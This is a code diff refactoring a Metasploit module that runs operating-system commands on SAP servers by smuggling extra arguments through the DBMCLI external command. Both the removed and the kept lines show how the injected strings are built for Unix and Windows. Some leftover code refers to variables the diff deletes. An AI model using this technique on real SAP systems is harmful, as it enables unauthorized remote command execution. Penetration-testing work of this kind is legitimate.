@@ -46,41 +46,22 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    @outfile = Rex::Text.rand_text_alpha(8)
+    opts = {
+        :rhost => rhost,
+        :rport => rport,
+        :client => client,
+        :user => user,
+        :pass => password
+    }
 
-    command = create_payload(1)
-    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)
+    res = dbmcli_sxpg_command_execute(datastore['OS'], datastore['CMD'], opts)
 
-    if res =~ /External program terminated with exit code/im
-      print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on target host")
-      return
-    end
-
-
-    command = create_payload(2)
-    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)
-
-    if res
-      print res
-    else
-      print_error("#{rhost}:#{rport} [SAP] No output received")
-    end
+    print res
   end
 
   def create_payload(num)
     command = ""
-
-    target_host = Rex::Text.rand_text_alpha(5)
-
-    if datastore['OS'].downcase == "unix"
-      if num == 1
-        command = "-o /tmp/#{@outfile} -n pwnie\n!" #"#{target_host}\n!"
-        command << datastore['CMD'].gsub(' ',"\t")
-        command << "\n"
-      else
-        command = "-ic /tmp/#{@outfile}"
-      end
-    elsif datastore['OS'].downcase == "windows nt"
+    if datastore['OS'].downcase == "windows nt"
       if num == 1
         command = "-o c:\\#{@outfile} -n #{target_host}\r\n!"
         space = "%programfiles:~10,1%"
@@ -94,26 +75,6 @@ class Metasploit4 < Msf::Auxiliary
     command
   end
 
-  def exec_CMD(user,client,pass,rhost,rport,command)
-    return nil if command.blank?
-
-    login(rhost, rport, client, user, pass) do |conn|
-      conn.connection_info
-
-      begin
-        data  = sxpg_command_execute(
-          conn,
-          {
-            :COMMANDNAME => 'DBMCLI',
-            :OPERATINGSYSTEM => 'ANYOS',
-            :ADDITIONAL_PARAMETERS => command
-          })
-        puts data
-        return data
-      rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
-      end
-    end
-  end
 end
+
 
